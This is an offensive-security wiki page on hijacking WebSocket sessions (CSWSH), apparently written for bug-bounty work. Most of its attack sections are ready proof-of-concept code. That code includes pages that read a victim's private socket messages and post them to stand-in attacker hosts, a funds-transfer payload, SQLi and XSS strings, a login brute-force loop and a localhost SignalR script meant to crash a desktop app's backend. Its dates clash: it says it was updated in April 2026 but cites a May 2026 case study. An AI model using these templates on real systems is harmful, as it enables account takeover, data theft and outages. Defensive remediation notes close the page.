---
type: wiki
category: attack
tool: burp,websocket-client,manual
status: active
last-updated: 2026-04-21
---

# WebSocket / CSWSH Attack Guide (2026 Edition)

> **Purpose:** WebSocket is common in realtime chat, stock tickers, games, and DevTools; but many WS servers don't do Origin checks / auth checks -> CSWSH (Cross-Site WebSocket Hijacking) directly hijacks sessions.

## 0. Principle and key differences

The WebSocket handshake goes through an HTTP Upgrade:

```
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Origin: https://evil.com         <- the browser sends this, but servers often don't block it
Sec-WebSocket-Key: xxxxxx
Sec-WebSocket-Version: 13
Cookie: session=xxx              <- cross-site cookies are attached automatically (not blocked by CORS)
```

**Key point**: WS is not subject to CORS restrictions. If the server doesn't validate the `Origin` header -> **any evil.com page can open a WS connection using the victim's cookie -> CSWSH**.

## 1. Detection

### 1.1 Finding WS endpoints

```bash
# Burp / Caido traffic filter: WebSocket
# or search HTML/JS
grep -r 'new WebSocket\|ws://\|wss://' static/

# Common paths
/ws  /socket  /socket.io/  /graphql  /events  /live  /realtime
```

### 1.2 Origin check test (the key to CSWSH)

```bash
# Use wscat / websocat
brew install websocat
# or
npm i -g wscat

# Send a fake Origin
wscat -c 'wss://target.com/ws' -H "Origin: https://evil.com" -H "Cookie: session=<VICTIM>"

# If the connection succeeds and can send/receive messages -> Origin is not blocked -> CSWSH
# If 403 / close code 1008 -> it's blocked
```

### 1.3 Auth test

```bash
# Without cookie / token
wscat -c wss://target.com/ws

# If it connects and receives realtime data -> usable unauthenticated
```

## 2. CSWSH PoC

### 2.1 Basic hijack (reading victim data)

```html
<!-- evil.com/attack.html -->
<script>
const ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => {
  // already connected - victim's session cookie was attached automatically
  ws.send(JSON.stringify({action:'subscribe',channel:'private:user'}));
};
ws.onmessage = (e) => {
  // eavesdrop on the victim's realtime data
  fetch('https://attacker/log', {method:'POST', body:e.data});
};
</script>
```

### 2.2 Send action (state-changing)

```javascript
ws.onopen = () => {
  ws.send(JSON.stringify({
    action: 'transfer',
    to: 'attacker@evil.com',
    amount: 1000
  }));
};
// If the WS directly executes a state-changing action with no per-message validation -> CSRF via WS
```

### 2.3 Full interactive PoC (Burp-style)

```html
<!DOCTYPE html>
<html><body>
<script>
const ws = new WebSocket('wss://target.com/socket.io/?EIO=4&transport=websocket');
const log = (msg) => {
  fetch('https://attacker.com/log', {method:'POST', body: JSON.stringify({t:Date.now(),msg})});
};

ws.onopen = () => {
  log('connected');
  // Enumerate every channel message the user receives
  ws.send('40'); // socket.io connect
  ws.send('42["list_my_chats"]');
  ws.send('42["read_inbox"]');
};

ws.onmessage = (e) => log('recv:' + e.data);
ws.onerror = (e) => log('err:' + e);
ws.onclose = (e) => log('close:' + e.code);
</script>
</body></html>
```

## 3. Vulnerabilities unique to WebSocket

### 3.1 Message-layer injection (SQLi / Cmd / XSS)

```javascript
// Each WS message is an independent request, and servers often forget input validation

ws.send(JSON.stringify({query: "1 OR 1=1--"}));
ws.send(JSON.stringify({nickname: "<img src=x onerror=alert(1)>"}));
```

Burp Repeater can intercept + modify WS messages (Pro has Repeater-for-WebSocket).

### 3.2 Rate limit bypass

WS often has no per-message rate limiting, whereas the HTTP endpoint does.

```javascript
// HTTP is blocked after 5 requests/minute
// Switching to WS may allow sending the same command unlimited times:
for(let i=0;i<10000;i++) ws.send(JSON.stringify({action:'login',user:'x',pass:'y'+i}));
```

### 3.3 Subscription IDOR

```
{"action":"subscribe","room":"user:123"}
# Change user_id to another user's ID -> see their realtime messages
```

### 3.4 GraphQL over WebSocket subscription

Many GraphQL servers use `graphql-ws` / `subscriptions-transport-ws`.

```javascript
ws.send(JSON.stringify({
  type: 'connection_init',
  payload: {Authorization: 'Bearer ...'}
}));
ws.send(JSON.stringify({
  id: '1',
  type: 'start',
  payload: {query: 'subscription { newMessage { user, text } }'}
}));
```

If the subscription resolver doesn't perform auth -> any connection can subscribe to a global event.

See [17-graphql-deep-attacks.md](17-graphql-deep-attacks.md).

### 3.5 Token passed in WS URL query (leaks to logs / referer)

```
wss://target.com/ws?token=JWT_HERE
```

Nginx access logs / proxy logs record the URL -> token leaked.

### 3.6 `wss://` downgraded to `ws://`

Man-in-the-middle / public WiFi attacks: if the client accepts `ws://`, a MITM can intervene.

## 4. Tools

### 4.1 wscat / websocat

```bash
wscat -c wss://target.com/ws -H "Cookie: session=xxx"
> {"action":"ping"}
< {"result":"pong"}

# websocat (more powerful)
websocat -E 'wss://target.com/ws' \
  -H='Cookie: session=xxx' \
  -H='Origin: https://evil.com'
```

### 4.2 Burp Suite

- Proxy -> HTTP history has a WebSocket tab
- Repeater -> Create from WebSocket message
- Intruder doesn't support WS, use the "WebSocket Turbo Intruder" extension instead

### 4.3 Caido

- Native support for WS intercept / replay

### 4.4 Nuclei WS support

```yaml
# Template example
protocol: websocket
requests:
  - url: wss://{{Hostname}}/ws
    headers:
      Origin: https://evil.com
    input: '{"action":"ping"}'
    matchers:
      - type: word
        words: ['pong']
```

### 4.5 Apache JMeter / Artillery

Load testing + abuse:

```bash
npm i -g artillery
artillery quick --count 100 --num 10 "wss://target.com/ws"
```

## 5. Full PoC: CSWSH -> Private message disclosure

### Step 1: Confirm there's no Origin check

```bash
websocat 'wss://target.com/ws' \
  -H='Origin: https://evil.com' \
  -H='Cookie: session=VICTIM_SESSION'
# Connects -> receives the victim's private messages -> CSWSH confirmed
```

### Step 2: Build evil.com

```html
<!-- evil.com/poc.html -->
<script>
const ws = new WebSocket('wss://target.com/ws');
let messages = [];
ws.onmessage = (e) => {
  messages.push(e.data);
  if (messages.length >= 10) {
    fetch('https://attacker/exfil', {method:'POST', body: JSON.stringify(messages)});
  }
};
</script>
```

### Step 3: Lure the victim

```
Victim logs into target.com (session cookie is set)
-> Victim opens evil.com/poc.html (same browser)
-> WS automatically attaches the cookie and connects to target.com/ws
-> All of the victim's private messages are exfiltrated to the attacker
```

### Step 4: Report

```markdown
## Vulnerability Summary
wss://target.com/ws does not validate the Origin header, allowing cross-origin
JavaScript to open a WebSocket connection using the victim's session cookie and
receive private channel messages.

## PoC
[evil.com HTML] + [attacker exfil log]

## Impact
- Any user logged into target.com who clicks the attacker's link has their private
  messages stolen in realtime
- If the WS allows sending, this becomes state-changing CSRF via WS

## Severity
P2 / High

## Remediation
1. Validate the Origin header at handshake time (allowlist)
2. Even with a valid Origin, don't rely on the session cookie for auth -> use a
   handshake-time verify token instead
3. GraphQL subscription resolvers must perform authz checks
```

## 6. Defense checklist (for remediation recommendations)

```
1. Server validates the Origin header (domain allowlist)
2. After the handshake, issue a CSRF-like token to the client that must be sent with every message
3. Don't rely on the session cookie for auth -> use a short-lived token instead
4. Perform per-request authz on every subscription / channel
5. Rate limit: per-connection + per-message
6. Input validation: schema-validate every inbound message
7. Never put tokens in the URL query
8. Only accept wss:// (HSTS + upgrade-insecure-requests)
9. CSP: restrict connect-src to the WS endpoint
```

## 7. Localhost CSWSH attack surface (Electron / desktop apps)

> Source: acme-corp case study (2026-05-22) — see Lesson #111-#115

Desktop apps often run a WebSocket service on localhost (Electron + C# backend, DevTools port, Jupyter, etc.), assuming "only the local machine can connect" and therefore skipping Origin validation. But CSWSH lets any website connect to localhost through the victim's browser.

### 7.1 Detection

```bash
# Find a localhost WS service
lsof -i -n -P | grep -E "(LISTEN|Electron|dotnet|kestrel|jupyter)"
# Test the Origin check (from evil.com's perspective)
wscat -c 'ws://localhost:10100/electron' --header 'Origin: https://evil.com'
```

### 7.2 SignalR JSON Protocol (.NET Kestrel backend)

```javascript
// 1. Handshake
ws.send(JSON.stringify({protocol:"json", version:1}) + '\x1e')
// 2. Call a server method
ws.send(JSON.stringify({
  type:1, invocationId:"1",
  target:'MethodName', arguments:[]
}) + '\x1e')
// 3. Response format
// type:3 = result; type:1 = invocation; \x1e = record separator
```

### 7.3 `Clients.Caller` vs `Clients.All` — impact-boundary determination

| C# routing pattern | What CSWSH can do |
|-------------|---------------|
| `Clients.Caller` | Only affects the CSWSH's own connection; cannot trigger other clients' handlers |
| `Clients.All` | Can eavesdrop on server->client events broadcast to all connections |

Static audit: grep for `Clients.` usage to confirm the routing pattern.

### 7.4 NativeAOT Kestrel — unhandled exception = instant process death

If the backend is NativeAOT-compiled (`file <binary>` shows a stripped Mach-O/ELF with no .NET metadata), any Hub method throwing an uncaught exception -> **the entire Kestrel process dies** (WebSocket closes with code=1006), instead of returning a 500 error.

```javascript
// Interpreting the response semantics
// "Method does not exist"               -> wrong name, try another
// type binding error                    -> name correct, argument type wrong, try other formats
// "An unexpected error occurred"        -> name correct, C# NullRef; not NativeAOT crashing
// code=1006 connection closed           -> P1 DoS, server crashed, stop testing
```

### 7.5 PoC template (localhost CSWSH)

```html
<script>
const ws = new WebSocket('ws://localhost:10100/electron');
const SEP = '\x1e';
ws.onopen = () => {
  ws.send(JSON.stringify({protocol:"json", version:1}) + SEP);
};
ws.onmessage = (e) => {
  const msg = JSON.parse(e.data.replace(SEP,''));
  if (msg.type === 6) {  // ping keepalive
    ws.send(JSON.stringify({type:6}) + SEP);
    return;
  }
  // handshake OK -> call method
  ws.send(JSON.stringify({
    type:1, invocationId:"dos",
    target:'SendInvitation', arguments:[]
  }) + SEP);
};
ws.onclose = (e) => console.log('Closed:', e.code, e.reason);
</script>
```

---

## Related Documents

- [17-graphql-deep-attacks.md](17-graphql-deep-attacks.md) — GraphQL subscription over WS
- [65-csrf-deep.md](65-csrf-deep.md) — CSRF fundamentals and Origin issues
- Lesson #111 — CSRF vs CSWSH persistent-channel differences
- Lesson #112 — localhost CSWSH attack surface
- Lesson #113 — Clients.Caller vs Clients.All boundary
- Lesson #114 — NativeAOT instant process death
- Lesson #115 — Hub method dynamic exclusion decisions
- PortSwigger WebSocket: https://portswigger.net/web-security/websockets
- OWASP WebSocket Security: https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#websocket-implementation-hints
- websocat: https://github.com/vi/websocat
